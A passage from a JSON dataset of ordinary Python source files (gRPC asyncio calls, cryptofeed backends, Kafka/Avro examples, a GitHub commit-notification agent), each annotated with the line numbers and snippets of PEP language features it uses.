                        "                    decode: Dict[str, Any] = self._transform_raw_message(raw_message)",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        47,
                        55,
                        "async generator",
                        "async def _socket_user_stream(self, conn: signalr_aio.Connection) -> AsyncIterable[str]:\n        try:\n            while True:\n                async with timeout(MESSAGE_TIMEOUT):\n                    msg = await conn.msg_queue.get()\n                    self._last_recv_time = time.time()\n                    yield msg\n        except asyncio.TimeoutError:\n            self.logger().warning(f\"Message recv() timed out. Reconnecting to Bittrex SignalR WebSocket... \")"
                    ],
                    [
                        98,
                        110,
                        "async for",
                        "async for raw_message in self._socket_user_stream(self._websocket_connection):\n                    decode: Dict[str, Any] = self._transform_raw_message(raw_message)\n                    if decode.get(\"error\") is not None:\n                        self.logger().error(decode[\"error\"])\n                        continue\n                    if decode.get(\"content\") is not None:\n                        content_type = decode[\"event_type\"]\n                        if content_type in [\"balance\", \"order\"]:  \n                            output.put_nowait(decode)\n                        elif content_type == \"re-authenticate\":\n                            await self.authenticate()\n                        elif content_type == \"heartbeat\":\n                            continue"
                    ]
                ],
                "pep_498": [
                    [
                        121,
                        "        challenge = f\"{timestamp}{randomized}\""
                    ],
                    [
                        55,
                        "            self.logger().warning(f\"Message recv() timed out. Reconnecting to Bittrex SignalR WebSocket... \")"
                    ],
                    [
                        63,
                        "                self.logger().error(f\"Error decoding message\", exc_info=True)"
                    ]
                ]
            }
        },
        "22": {
            "file": "import asyncio\nimport enum\nfrom functools import partial\nimport inspect\nimport logging\nimport traceback\nfrom typing import Any, AsyncIterator, Generator, Generic, Optional, Tuple\nimport grpc\nfrom grpc import _common\nfrom grpc._cython import cygrpc\nfrom . import _base_call\nfrom ._metadata import Metadata\nfrom ._typing import DeserializingFunction\nfrom ._typing import DoneCallbackType\nfrom ._typing import MetadatumType\nfrom ._typing import RequestIterableType\nfrom ._typing import RequestType\nfrom ._typing import ResponseType\nfrom ._typing import SerializingFunction\n__all__ = \"AioRpcError\", \"Call\", \"UnaryUnaryCall\", \"UnaryStreamCall\"\n_LOCAL_CANCELLATION_DETAILS = \"Locally cancelled by application!\"\n_GC_CANCELLATION_DETAILS = \"Cancelled upon garbage collection!\"\n_RPC_ALREADY_FINISHED_DETAILS = \"RPC already finished.\"\n_RPC_HALF_CLOSED_DETAILS = 'RPC is half closed after calling \"done_writing\".'\n_API_STYLE_ERROR = (\n    \"The iterator and read/write APIs may not be mixed on a single RPC.\"\n)\n_OK_CALL_REPRESENTATION = (\n    '<{} of RPC that terminated with:\\n\\tstatus = {}\\n\\tdetails = \"{}\"\\n>'\n)\n_NON_OK_CALL_REPRESENTATION = (\n    \"<{} of RPC that terminated with:\\n\"\n    \"\\tstatus = {}\\n\"\n    '\\tdetails = \"{}\"\\n'\n    '\\tdebug_error_string = \"{}\"\\n'\n    \">\"\n)\n_LOGGER = logging.getLogger(__name__)\nclass AioRpcError(grpc.RpcError):\n    _code: grpc.StatusCode\n    _details: Optional[str]\n    _initial_metadata: Optional[Metadata]\n    _trailing_metadata: Optional[Metadata]\n    _debug_error_string: Optional[str]\n    def __init__(\n        self,\n        code: grpc.StatusCode,\n        initial_metadata: Metadata,\n        trailing_metadata: Metadata,\n        details: Optional[str] = None,\n        debug_error_string: Optional[str] = None,\n    ) -> None:\n        super().__init__()\n        self._code = code\n        self._details = details\n        self._initial_metadata = initial_metadata\n        self._trailing_metadata = trailing_metadata\n        self._debug_error_string = debug_error_string\n    def code(self) -> grpc.StatusCode:\n        return self._code\n    def details(self) -> Optional[str]:\n        return self._details\n    def initial_metadata(self) -> Metadata:\n        return self._initial_metadata\n    def trailing_metadata(self) -> Metadata:\n        return self._trailing_metadata\n    def debug_error_string(self) -> str:\n        return self._debug_error_string\n    def _repr(self) -> str:\n        return _NON_OK_CALL_REPRESENTATION.format(\n            self.__class__.__name__,\n            self._code,\n            self._details,\n            self._debug_error_string,\n        )\n    def __repr__(self) -> str:\n        return self._repr()\n    def __str__(self) -> str:\n        return self._repr()\n    def __reduce__(self):\n        return (\n            type(self),\n            (\n                self._code,\n                self._initial_metadata,\n                self._trailing_metadata,\n                self._details,\n                self._debug_error_string,\n            ),\n        )\ndef _create_rpc_error(\n    initial_metadata: Metadata, status: cygrpc.AioRpcStatus\n) -> AioRpcError:\n    return AioRpcError(\n        _common.CYGRPC_STATUS_CODE_TO_STATUS_CODE[status.code()],\n        Metadata.from_tuple(initial_metadata),\n        Metadata.from_tuple(status.trailing_metadata()),\n        details=status.details(),\n        debug_error_string=status.debug_error_string(),\n    )\nclass Call:\n    _loop: asyncio.AbstractEventLoop\n    _code: grpc.StatusCode\n    _cython_call: cygrpc._AioCall\n    _metadata: Tuple[MetadatumType, ...]\n    _request_serializer: SerializingFunction\n    _response_deserializer: DeserializingFunction\n    def __init__(\n        self,\n        cython_call: cygrpc._AioCall,\n        metadata: Metadata,\n        request_serializer: SerializingFunction,\n        response_deserializer: DeserializingFunction,\n        loop: asyncio.AbstractEventLoop,\n    ) -> None:\n        self._loop = loop\n        self._cython_call = cython_call\n        self._metadata = tuple(metadata)\n        self._request_serializer = request_serializer\n        self._response_deserializer = response_deserializer\n    def __del__(self) -> None:\n        if hasattr(self, \"_cython_call\"):\n            if not self._cython_call.done():\n                self._cancel(_GC_CANCELLATION_DETAILS)\n    def cancelled(self) -> bool:\n        return self._cython_call.cancelled()\n    def _cancel(self, details: str) -> bool:\n        if not self._cython_call.done():\n            self._cython_call.cancel(details)\n            return True\n        else:\n            return False\n    def cancel(self) -> bool:\n        return self._cancel(_LOCAL_CANCELLATION_DETAILS)\n    def done(self) -> bool:\n        return self._cython_call.done()\n    def add_done_callback(self, callback: DoneCallbackType) -> None:\n        cb = partial(callback, self)\n        self._cython_call.add_done_callback(cb)\n    def time_remaining(self) -> Optional[float]:\n        return self._cython_call.time_remaining()\n    async def initial_metadata(self) -> Metadata:\n        raw_metadata_tuple = await self._cython_call.initial_metadata()\n        return Metadata.from_tuple(raw_metadata_tuple)\n    async def trailing_metadata(self) -> Metadata:\n        raw_metadata_tuple = (\n            await self._cython_call.status()\n        ).trailing_metadata()\n        return Metadata.from_tuple(raw_metadata_tuple)\n    async def code(self) -> grpc.StatusCode:\n        cygrpc_code = (await self._cython_call.status()).code()\n        return _common.CYGRPC_STATUS_CODE_TO_STATUS_CODE[cygrpc_code]\n    async def details(self) -> str:\n        return (await self._cython_call.status()).details()\n    async def debug_error_string(self) -> str:\n        return (await self._cython_call.status()).debug_error_string()\n    async def _raise_for_status(self) -> None:\n        if self._cython_call.is_locally_cancelled():\n            raise asyncio.CancelledError()\n        code = await self.code()\n        if code != grpc.StatusCode.OK:\n            raise _create_rpc_error(\n                await self.initial_metadata(), await self._cython_call.status()\n            )\n    def _repr(self) -> str:\n        return repr(self._cython_call)\n    def __repr__(self) -> str:\n        return self._repr()\n    def __str__(self) -> str:\n        return self._repr()\nclass _APIStyle(enum.IntEnum):\n    UNKNOWN = 0\n    ASYNC_GENERATOR = 1\n    READER_WRITER = 2\nclass _UnaryResponseMixin(Call, Generic[ResponseType]):\n    _call_response: asyncio.Task\n    def _init_unary_response_mixin(self, response_task: asyncio.Task):\n        self._call_response = response_task\n    def cancel(self) -> bool:\n        if super().cancel():\n            self._call_response.cancel()\n            return True\n        else:\n            return False\n    def __await__(self) -> Generator[Any, None, ResponseType]:\n        try:\n            response = yield from self._call_response\n        except asyncio.CancelledError:\n            if not self.cancelled():\n                self.cancel()\n            raise\n        if response is cygrpc.EOF:\n            if self._cython_call.is_locally_cancelled():\n                raise asyncio.CancelledError()\n            else:\n                raise _create_rpc_error(\n                    self._cython_call._initial_metadata,\n                    self._cython_call._status,\n                )\n        else:\n            return response\nclass _StreamResponseMixin(Call):\n    _message_aiter: AsyncIterator[ResponseType]\n    _preparation: asyncio.Task\n    _response_style: _APIStyle\n    def _init_stream_response_mixin(self, preparation: asyncio.Task):\n        self._message_aiter = None\n        self._preparation = preparation\n        self._response_style = _APIStyle.UNKNOWN\n    def _update_response_style(self, style: _APIStyle):\n        if self._response_style is _APIStyle.UNKNOWN:\n            self._response_style = style\n        elif self._response_style is not style:\n            raise cygrpc.UsageError(_API_STYLE_ERROR)\n    def cancel(self) -> bool:\n        if super().cancel():\n            self._preparation.cancel()\n            return True\n        else:\n            return False\n    async def _fetch_stream_responses(self) -> ResponseType:\n        message = await self._read()\n        while message is not cygrpc.EOF:\n            yield message\n            message = await self._read()\n        await self._raise_for_status()\n    def __aiter__(self) -> AsyncIterator[ResponseType]:\n        self._update_response_style(_APIStyle.ASYNC_GENERATOR)\n        if self._message_aiter is None:\n            self._message_aiter = self._fetch_stream_responses()\n        return self._message_aiter\n    async def _read(self) -> ResponseType:\n        await self._preparation\n        try:\n            raw_response = await self._cython_call.receive_serialized_message()\n        except asyncio.CancelledError:\n            if not self.cancelled():\n                self.cancel()\n            raise\n        if raw_response is cygrpc.EOF:\n            return cygrpc.EOF\n        else:\n            return _common.deserialize(\n                raw_response, self._response_deserializer\n            )\n    async def read(self) -> ResponseType:\n        if self.done():\n            await self._raise_for_status()\n            return cygrpc.EOF\n        self._update_response_style(_APIStyle.READER_WRITER)\n        response_message = await self._read()\n        if response_message is cygrpc.EOF:\n            await self._raise_for_status()\n        return response_message\nclass _StreamRequestMixin(Call):\n    _metadata_sent: asyncio.Event\n    _done_writing_flag: bool\n    _async_request_poller: Optional[asyncio.Task]\n    _request_style: _APIStyle\n    def _init_stream_request_mixin(\n        self, request_iterator: Optional[RequestIterableType]\n    ):\n        self._metadata_sent = asyncio.Event()\n        self._done_writing_flag = False\n        if request_iterator is not None:\n            self._async_request_poller = self._loop.create_task(\n                self._consume_request_iterator(request_iterator)\n            )\n            self._request_style = _APIStyle.ASYNC_GENERATOR\n        else:\n            self._async_request_poller = None\n            self._request_style = _APIStyle.READER_WRITER\n    def _raise_for_different_style(self, style: _APIStyle):\n        if self._request_style is not style:\n            raise cygrpc.UsageError(_API_STYLE_ERROR)\n    def cancel(self) -> bool:\n        if super().cancel():\n            if self._async_request_poller is not None:\n                self._async_request_poller.cancel()\n            return True\n        else:\n            return False\n    def _metadata_sent_observer(self):\n        self._metadata_sent.set()\n    async def _consume_request_iterator(\n        self, request_iterator: RequestIterableType\n    ) -> None:\n        try:\n            if inspect.isasyncgen(request_iterator) or hasattr(\n                request_iterator, \"__aiter__\"\n            ):\n                async for request in request_iterator:\n                    try:\n                        await self._write(request)\n                    except AioRpcError as rpc_error:\n                        _LOGGER.debug(\n                            (\n                                \"Exception while consuming the\"\n                                \" request_iterator: %s\"\n                            ),\n                            rpc_error,\n                        )\n                        return\n            else:\n                for request in request_iterator:\n                    try:\n                        await self._write(request)\n                    except AioRpcError as rpc_error:\n                        _LOGGER.debug(\n                            (\n                                \"Exception while consuming the\"\n                                \" request_iterator: %s\"\n                            ),\n                            rpc_error,\n                        )\n                        return\n            await self._done_writing()\n        except:  \n            _LOGGER.debug(\n                \"Client request_iterator raised exception:\\n%s\",\n                traceback.format_exc(),\n            )\n            self.cancel()\n    async def _write(self, request: RequestType) -> None:\n        if self.done():\n            raise asyncio.InvalidStateError(_RPC_ALREADY_FINISHED_DETAILS)\n        if self._done_writing_flag:\n            raise asyncio.InvalidStateError(_RPC_HALF_CLOSED_DETAILS)\n        if not self._metadata_sent.is_set():\n            await self._metadata_sent.wait()\n            if self.done():\n                await self._raise_for_status()\n        serialized_request = _common.serialize(\n            request, self._request_serializer\n        )\n        try:\n            await self._cython_call.send_serialized_message(serialized_request)\n        except cygrpc.InternalError as err:\n            self._cython_call.set_internal_error(str(err))\n            await self._raise_for_status()\n        except asyncio.CancelledError:\n            if not self.cancelled():\n                self.cancel()\n            raise\n    async def _done_writing(self) -> None:\n        if self.done():\n            return\n        if not self._done_writing_flag:\n            self._done_writing_flag = True\n            try:\n                await self._cython_call.send_receive_close()\n            except asyncio.CancelledError:\n                if not self.cancelled():\n                    self.cancel()\n                raise\n    async def write(self, request: RequestType) -> None:\n        self._raise_for_different_style(_APIStyle.READER_WRITER)\n        await self._write(request)\n    async def done_writing(self) -> None:\n        self._raise_for_different_style(_APIStyle.READER_WRITER)\n        await self._done_writing()\n    async def wait_for_connection(self) -> None:\n        await self._metadata_sent.wait()\n        if self.done():\n            await self._raise_for_status()\nclass UnaryUnaryCall(_UnaryResponseMixin, Call, _base_call.UnaryUnaryCall):\n    _request: RequestType\n    _invocation_task: asyncio.Task\n    def __init__(\n        self,\n        request: RequestType,\n        deadline: Optional[float],\n        metadata: Metadata,\n        credentials: Optional[grpc.CallCredentials],\n        wait_for_ready: Optional[bool],\n        channel: cygrpc.AioChannel,\n        method: bytes,\n        request_serializer: SerializingFunction,\n        response_deserializer: DeserializingFunction,\n        loop: asyncio.AbstractEventLoop,\n    ) -> None:\n        super().__init__(\n            channel.call(method, deadline, credentials, wait_for_ready),\n            metadata,\n            request_serializer,\n            response_deserializer,\n            loop,\n        )\n        self._request = request\n        self._invocation_task = loop.create_task(self._invoke())\n        self._init_unary_response_mixin(self._invocation_task)\n    async def _invoke(self) -> ResponseType:\n        serialized_request = _common.serialize(\n            self._request, self._request_serializer\n        )\n        try:\n            serialized_response = await self._cython_call.unary_unary(\n                serialized_request, self._metadata\n            )\n        except asyncio.CancelledError:\n            if not self.cancelled():\n                self.cancel()\n        if self._cython_call.is_ok():\n            return _common.deserialize(\n                serialized_response, self._response_deserializer\n            )\n        else:\n            return cygrpc.EOF\n    async def wait_for_connection(self) -> None:\n        await self._invocation_task\n        if self.done():\n            await self._raise_for_status()\nclass UnaryStreamCall(_StreamResponseMixin, Call, _base_call.UnaryStreamCall):\n    _request: RequestType\n    _send_unary_request_task: asyncio.Task\n    def __init__(\n        self,\n        request: RequestType,\n        deadline: Optional[float],\n        metadata: Metadata,\n        credentials: Optional[grpc.CallCredentials],\n        wait_for_ready: Optional[bool],\n        channel: cygrpc.AioChannel,\n        method: bytes,\n        request_serializer: SerializingFunction,\n        response_deserializer: DeserializingFunction,\n        loop: asyncio.AbstractEventLoop,\n    ) -> None:\n        super().__init__(\n            channel.call(method, deadline, credentials, wait_for_ready),\n            metadata,\n            request_serializer,\n            response_deserializer,\n            loop,\n        )\n        self._request = request\n        self._send_unary_request_task = loop.create_task(\n            self._send_unary_request()\n        )\n        self._init_stream_response_mixin(self._send_unary_request_task)\n    async def _send_unary_request(self) -> ResponseType:\n        serialized_request = _common.serialize(\n            self._request, self._request_serializer\n        )\n        try:\n            await self._cython_call.initiate_unary_stream(\n                serialized_request, self._metadata\n            )\n        except asyncio.CancelledError:\n            if not self.cancelled():\n                self.cancel()\n            raise\n    async def wait_for_connection(self) -> None:\n        await self._send_unary_request_task\n        if self.done():\n            await self._raise_for_status()\nclass StreamUnaryCall(\n    _StreamRequestMixin, _UnaryResponseMixin, Call, _base_call.StreamUnaryCall\n):\n    def __init__(\n        self,\n        request_iterator: Optional[RequestIterableType],\n        deadline: Optional[float],\n        metadata: Metadata,\n        credentials: Optional[grpc.CallCredentials],\n        wait_for_ready: Optional[bool],\n        channel: cygrpc.AioChannel,\n        method: bytes,\n        request_serializer: SerializingFunction,\n        response_deserializer: DeserializingFunction,\n        loop: asyncio.AbstractEventLoop,\n    ) -> None:\n        super().__init__(\n            channel.call(method, deadline, credentials, wait_for_ready),\n            metadata,\n            request_serializer,\n            response_deserializer,\n            loop,\n        )\n        self._init_stream_request_mixin(request_iterator)\n        self._init_unary_response_mixin(loop.create_task(self._conduct_rpc()))\n    async def _conduct_rpc(self) -> ResponseType:\n        try:\n            serialized_response = await self._cython_call.stream_unary(\n                self._metadata, self._metadata_sent_observer\n            )\n        except asyncio.CancelledError:\n            if not self.cancelled():\n                self.cancel()\n            raise\n        if self._cython_call.is_ok():\n            return _common.deserialize(\n                serialized_response, self._response_deserializer\n            )\n        else:\n            return cygrpc.EOF\nclass StreamStreamCall(\n    _StreamRequestMixin, _StreamResponseMixin, Call, _base_call.StreamStreamCall\n):\n    _initializer: asyncio.Task\n    def __init__(\n        self,\n        request_iterator: Optional[RequestIterableType],\n        deadline: Optional[float],\n        metadata: Metadata,\n        credentials: Optional[grpc.CallCredentials],\n        wait_for_ready: Optional[bool],\n        channel: cygrpc.AioChannel,\n        method: bytes,\n        request_serializer: SerializingFunction,\n        response_deserializer: DeserializingFunction,\n        loop: asyncio.AbstractEventLoop,\n    ) -> None:\n        super().__init__(\n            channel.call(method, deadline, credentials, wait_for_ready),\n            metadata,\n            request_serializer,\n            response_deserializer,\n            loop,\n        )\n        self._initializer = self._loop.create_task(self._prepare_rpc())\n        self._init_stream_request_mixin(request_iterator)\n        self._init_stream_response_mixin(self._initializer)\n    async def _prepare_rpc(self):\n        try:\n            await self._cython_call.initiate_stream_stream(\n                self._metadata, self._metadata_sent_observer\n            )\n        except asyncio.CancelledError:\n            if not self.cancelled():\n                self.cancel()",
            "patterns": {
                "pep_526": [
                    [
                        40,
                        "_code: grpc.StatusCode"
                    ],
                    [
                        41,
                        "_details: Optional[str]"
                    ],
                    [
                        42,
                        "_initial_metadata: Optional[Metadata]"
                    ],
                    [
                        43,
                        "_trailing_metadata: Optional[Metadata]"
                    ],
                    [
                        44,
                        "_debug_error_string: Optional[str]"
                    ],
                    [
                        102,
                        "_loop: asyncio.AbstractEventLoop"
                    ],
                    [
                        103,
                        "_code: grpc.StatusCode"
                    ],
                    [
                        104,
                        "_cython_call: cygrpc._AioCall"
                    ],
                    [
                        105,
                        "_metadata: Tuple[MetadatumType, ...]"
                    ],
                    [
                        106,
                        "_request_serializer: SerializingFunction"
                    ],
                    [
                        107,
                        "_response_deserializer: DeserializingFunction"
                    ],
                    [
                        176,
                        "_call_response: asyncio.Task"
                    ],
                    [
                        203,
                        "_message_aiter: AsyncIterator[ResponseType]"
                    ],
                    [
                        204,
                        "_preparation: asyncio.Task"
                    ],
                    [
                        205,
                        "_response_style: _APIStyle"
                    ],
                    [
                        256,
                        "_metadata_sent: asyncio.Event"
                    ],
                    [
                        257,
                        "_done_writing_flag: bool"
                    ],
                    [
                        258,
                        "_async_request_poller: Optional[asyncio.Task]"
                    ],
                    [
                        259,
                        "_request_style: _APIStyle"
                    ],
                    [
                        367,
                        "_request: RequestType"
                    ],
                    [
                        368,
                        "_invocation_task: asyncio.Task"
                    ],
                    [
                        414,
                        "_request: RequestType"
                    ],
                    [
                        415,
                        "_send_unary_request_task: asyncio.Task"
                    ],
                    [
                        500,
                        "_initializer: asyncio.Task"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        7,
                        "from typing import Any, AsyncIterator, Generator, Generic, Optional, Tuple",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        105,
                        "    _metadata: Tuple[MetadatumType, ...]",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        221,
                        226,
                        "async generator",
                        "async def _fetch_stream_responses(self) -> ResponseType:\n        message = await self._read()\n        while message is not cygrpc.EOF:\n            yield message\n            message = await self._read()\n        await self._raise_for_status()"
                    ],
                    [
                        292,
                        303,
                        "async for",
                        "async for request in request_iterator:\n                    try:\n                        await self._write(request)\n                    except AioRpcError as rpc_error:\n                        _LOGGER.debug(\n                            (\n                                \"Exception while consuming the\"\n                                \" request_iterator: %s\"\n                            ),\n                            rpc_error,\n                        )\n                        return"
                    ]
                ]
            }
        },
        "23": {
            "file": "import asyncio\nfrom asyncio.queues import Queue\nfrom contextlib import asynccontextmanager\nfrom decimal import Decimal\nfrom cryptofeed.backends._util import book_convert, book_delta_convert\nfrom cryptofeed.defines import BID, ASK\nclass BackendQueue:\n    def start(self, loop: asyncio.AbstractEventLoop):\n        self.queue = Queue()\n        loop.create_task(self.writer())\n    async def writer(self):\n        raise NotImplementedError\n    @asynccontextmanager\n    async def read_queue(self):\n        update = await self.queue.get()\n        yield update\n        self.queue.task_done()\nclass BackendBookCallback:\n    async def __call__(self, *, feed: str, symbol: str, book: dict, timestamp: float, receipt_timestamp: float):\n        data = {'timestamp': timestamp, 'receipt_timestamp': receipt_timestamp, 'delta': False, BID: {}, ASK: {}}\n        book_convert(book, data, convert=self.numeric_type)\n        await self.write(feed, symbol, timestamp, receipt_timestamp, data)\nclass BackendBookDeltaCallback:\n    async def __call__(self, *, feed: str, symbol: str, delta: dict, timestamp: float, receipt_timestamp: float):\n        data = {'timestamp': timestamp, 'receipt_timestamp': receipt_timestamp, 'delta': True, BID: {}, ASK: {}}\n        book_delta_convert(delta, data, convert=self.numeric_type)\n        await self.write(feed, symbol, timestamp, receipt_timestamp, data)\nclass BackendTradeCallback:\n    async def __call__(self, *, feed: str, symbol: str, side: str, amount: Decimal, price: Decimal, order_id=None, timestamp: float, receipt_timestamp: float, order_type: str = None):\n        data = {'feed': feed, 'symbol': symbol, 'timestamp': timestamp, 'receipt_timestamp': receipt_timestamp,\n                'side': side, 'amount': self.numeric_type(amount), 'price': self.numeric_type(price)}\n        if order_id:\n            data['id'] = order_id\n        if order_type:\n            data['order_type'] = order_type\n        await self.write(feed, symbol, timestamp, receipt_timestamp, data)\nclass BackendFundingCallback:\n    async def __call__(self, *, feed, symbol, **kwargs):\n        for key in kwargs:\n            if isinstance(kwargs[key], Decimal):\n                kwargs[key] = self.numeric_type(kwargs[key])\n        kwargs['feed'] = feed\n        kwargs['symbol'] = symbol\n        timestamp = kwargs.get('timestamp')\n        receipt_timestamp = kwargs.get('receipt_timestamp')\n        await self.write(feed, symbol, timestamp, receipt_timestamp, kwargs)\nclass BackendTickerCallback:\n    async def __call__(self, *, feed: str, symbol: str, bid: Decimal, ask: Decimal, timestamp: float, receipt_timestamp: float):\n        data = {'feed': feed, 'symbol': symbol, 'bid': self.numeric_type(bid), 'ask': self.numeric_type(ask), 'receipt_timestamp': receipt_timestamp, 'timestamp': timestamp}\n        await self.write(feed, symbol, timestamp, receipt_timestamp, data)\nclass BackendOpenInterestCallback:\n    async def __call__(self, *, feed: str, symbol: str, open_interest: Decimal, timestamp: float, receipt_timestamp: float):\n        data = {'feed': feed, 'symbol': symbol, 'open_interest': self.numeric_type(open_interest), 'receipt_timestamp': receipt_timestamp, 'timestamp': timestamp}\n        await self.write(feed, symbol, timestamp, receipt_timestamp, data)\nclass BackendFuturesIndexCallback:\n    async def __call__(self, *, feed: str, symbol: str, futures_index: Decimal, timestamp: float, receipt_timestamp: float):\n        data = {'feed': feed, 'symbol': symbol, 'futures_index': self.numeric_type(futures_index), 'receipt_timestamp': receipt_timestamp, 'timestamp': timestamp}\n        await self.write(feed, symbol, timestamp, receipt_timestamp, data)\nclass BackendLiquidationsCallback:\n    async def __call__(self, *, feed: str, symbol: str, side: str, leaves_qty: Decimal, price: Decimal, order_id: str, timestamp: float, receipt_timestamp: float):\n        data = {'feed': feed, 'symbol': symbol, 'side': side, 'leaves_qty': self.numeric_type(leaves_qty), 'price': self.numeric_type(price), 'order_id': order_id if order_id else \"None\", 'receipt_timestamp': receipt_timestamp, 'timestamp': timestamp}\n        await self.write(feed, symbol, timestamp, receipt_timestamp, data)\nclass BackendMarketInfoCallback:\n    async def __call__(self, *, feed: str, symbol: str, timestamp: float, **kwargs):\n        kwargs['feed'] = feed\n        kwargs['symbol'] = symbol\n        kwargs['timestamp'] = timestamp\n        await self.write(feed, symbol, timestamp, timestamp, kwargs)\nclass BackendTransactionsCallback:\n    async def __call__(self, *, feed: str, symbol: str, timestamp: float, **kwargs):\n        kwargs['feed'] = feed\n        kwargs['symbol'] = symbol\n        kwargs['timestamp'] = timestamp\n        await self.write(feed, symbol, timestamp, timestamp, kwargs)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        14,
                        17,
                        "async generator",
                        "async def read_queue(self):\n        update = await self.queue.get()\n        yield update\n        self.queue.task_done()"
                    ]
                ]
            }
        },
        "24": {
            "file": "import asyncio\nimport aiohttp\nimport pytest\n@pytest.yield_fixture(scope=\"session\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\n@pytest.yield_fixture(scope=\"session\")\nasync def http_session():\n    async with aiohttp.ClientSession() as session:\n        yield session",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        9,
                        11,
                        "async generator",
                        "async def http_session():\n    async with aiohttp.ClientSession() as session:\n        yield session"
                    ]
                ]
            }
        },
        "25": {
            "file": "import asyncio\nimport enum\nimport random\nfrom dataclasses import dataclass\nfrom aiokafka import AIOKafkaConsumer, AIOKafkaProducer\nfrom dataclasses_avroschema import AvroModel\nclass FavoriteColor(enum.Enum):\n    BLUE = \"BLUE\"\n    YELLOW = \"YELLOW\"\n    GREEN = \"GREEN\"\n@dataclass\nclass UserModel(AvroModel):\n    \"An User\"\n    name: str\n    age: int\n    favorite_colors: FavoriteColor = FavoriteColor.BLUE\n    country: str = \"Argentina\"\n    address: str = None\n    class Meta:\n        namespace = \"User.v1\"\n        aliases = [\"user-v1\", \"super user\"]\nasync def consume(loop, total_events=10):\n    consumer = AIOKafkaConsumer(\n        \"my_topic\", \"my_other_topic\", loop=loop, bootstrap_servers=\"localhost:9092\", group_id=\"my-group\"\n    )\n    await consumer.start()\n    run_consumer = True\n    while run_consumer:\n        try:\n            async for msg in consumer:\n                print(f\"Message received: {msg.value} at {msg.timestamp}\")\n                user = UserModel.deserialize(msg.value)\n                print(f\"Message deserialized: {user}\")\n        except KeyboardInterrupt:\n            await consumer.stop()\n            print(\"Stoping consumer...\")\n            run_consumer = False\nasync def send(loop, total_events=10):\n    producer = AIOKafkaProducer(loop=loop, bootstrap_servers=\"localhost:9092\")\n    await producer.start()\n    for event_number in range(1, total_events + 1):\n        print(f\"Sending event number {event_number}\")\n        user = UserModel(\n            name=random.choice(\n                [\n                    \"Juan\",\n                    \"Peter\",\n                    \"Michael\",\n                    \"Moby\",\n                    \"Kim\",\n                ]\n            ),\n            age=random.randint(1, 50),\n        )\n        message = user.serialize()\n        await producer.send_and_wait(\"my_topic\", message)\n        await asyncio.sleep(2)\n    else:\n        await producer.stop()\n        print(\"Stoping producer...\")\nif __name__ == \"__main__\":\n    loop = asyncio.get_event_loop()\n    tasks = asyncio.gather(send(loop), consume(loop))\n    loop.run_until_complete(tasks)",
            "patterns": {
                "pep_526": [
                    [
                        14,
                        "name: str"
                    ],
                    [
                        15,
                        "age: int"
                    ],
                    [
                        16,
                        "favorite_colors: FavoriteColor = FavoriteColor.BLUE"
                    ],
                    [
                        17,
                        "country: str = \"Argentina\""
                    ],
                    [
                        18,
                        "address: str = None"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_557": [
                    [
                        4,
                        4,
                        "dataclasses import",
                        "from dataclasses import dataclass"
                    ],
                    [
                        12,
                        21,
                        "dataclass definition",
                        "class UserModel(AvroModel):\n    \"An User\"\n    name: str\n    age: int\n    favorite_colors: FavoriteColor = FavoriteColor.BLUE\n    country: str = \"Argentina\"\n    address: str = None\n    class Meta:\n        namespace = \"User.v1\"\n        aliases = [\"user-v1\", \"super user\"]"
                    ]
                ],
                "pep_525": [
                    [
                        30,
                        33,
                        "async for",
                        "async for msg in consumer:\n                print(f\"Message received: {msg.value} at {msg.timestamp}\")\n                user = UserModel.deserialize(msg.value)\n                print(f\"Message deserialized: {user}\")"
                    ]
                ],
                "pep_498": [
                    [
                        42,
                        "        print(f\"Sending event number {event_number}\")"
                    ],
                    [
                        31,
                        "                print(f\"Message received: {msg.value} at {msg.timestamp}\")"
                    ],
                    [
                        33,
                        "                print(f\"Message deserialized: {user}\")"
                    ]
                ]
            }
        },
        "26": {
            "file": "import aiohttp\nimport asyncio\nimport msgpack\nimport logging\nfrom datetime import timedelta\nfrom socket import create_connection\nimport config\nasync def getCommits(user, repo):\n    async with aiohttp.ClientSession() as session:\n        url = f'https://api.github.com/repos/{user}/{repo}/commits'\n        auth = {\n            'User-Agent': 'JARVIS/v2 (https://github.com/PatchesPrime/JARVIS)',\n            'Authorization': 'token {}'.format(config.github)\n        }\n        async with session.get(url, headers=auth) as response:\n            data = [\n                {\n                    'id': commit['sha'],\n                    'author': commit['commit']['author']['name'],\n                    'message': commit['commit']['message'],\n                    'date': commit['commit']['committer']['date'],\n                    'url': commit['html_url']\n                }\n                for commit in await response.json()\n            ]\n            return data\nasync def agent(db, *, freq=timedelta(hours=12)):\n    while True:\n        logging.debug('Checking for new commits to known repositories..')\n        qfilter = {'user': 1, 'git': 1}\n        async for sub in db.subscribers.find({}, qfilter):\n            for info in sub['git']:\n                logging.debug('GIT: {}'.format(info))\n                known = await db.git.distinct(\n                    'commits.id',\n                    {'id': '{user}/{repo}'.format(**info)}\n                )\n                data = await getCommits(info['user'], info['repo'])\n                digest = [\n                    '\\nNew commit(s) on {}/{}'.format(\n                        info['user'], info['repo']\n                    )\n                ]\n                for commit in data:\n                    if commit['id'] not in known:\n                        if len(known) >= 1:\n                            msg = '{}\\n{}'.format(\n                                commit['message'],\n                                commit['url']\n                            )\n                            digest.append(msg)\n                        result = await db.git.update_one(\n                            {'id': '{user}/{repo}'.format(**info)},\n                            {'$push': {'commits': commit}},\n                            upsert=True\n                        )\n                        logging.debug('Upsert: {}'.format(result))\n                if len(digest) >= 2:\n                    payload = {\n                        'to': sub['user'],\n                        'msg': '\\n\\n'.join(digest),\n                        'type': 'git',\n                    }\n                    logging.debug('payload={}'.format(payload))\n                    sock = create_connection(('192.168.1.200', 8888))\n                    sock.send(msgpack.packb(payload))\n                    sock.close()\n        logging.debug(\n            'agent.github sleeping for {}'.format(freq.total_seconds())\n        )\n        await asyncio.sleep(freq.total_seconds())",
            "patterns": {
                "pep_468": [
                    [
